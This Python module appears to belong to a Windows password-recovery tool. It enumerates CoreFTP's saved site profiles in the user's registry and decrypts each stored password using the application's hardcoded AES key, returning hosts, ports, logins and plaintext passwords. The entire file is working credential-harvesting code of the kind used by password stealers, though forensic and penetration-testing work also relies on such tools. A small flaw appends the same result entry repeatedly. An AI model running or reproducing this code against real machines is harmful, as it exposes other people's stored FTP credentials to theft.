# -*- coding: utf-8 -*-
import binascii
from winsecs.utils import winreg, OpenKey, log

from Crypto.Cipher import AES


class CoreFTP:
    def run(self):
        key = None
        pwd_found = []
        try:
            key = OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\FTPware\\CoreFTP\\Sites')
        except Exception as e:
            log.debug(str(e))

        if key:
            num_profiles = winreg.QueryInfoKey(key)[0]
            for n in range(num_profiles):
                name_skey = winreg.EnumKey(key, n)
                skey = OpenKey(key, name_skey)
                num = winreg.QueryInfoKey(skey)[1]
                values = {}
                for nn in range(num):
                    k = winreg.EnumValue(skey, nn)
                    if k[0] in ['Host', 'Port', 'User', 'PW']:
                        if k[0] == 'User':
                            values['Login'] = k[1]
                        if k[0] == 'PW':
                            try:
                                values['Password'] = AES.new(
                                    b"hdfzpysvpzimorhk", AES.MODE_ECB
                                ).decrypt(binascii.unhexlify(k[1])).split(b'\x00')[0]
                            except Exception as e:
                                log.debug(str(e))
                        else:
                            values[k[0]] = k[1]
                        pwd_found.append(values)

                winreg.CloseKey(skey)
            winreg.CloseKey(key)

            return pwd_found


modules = {"CoreFTP": CoreFTP()}
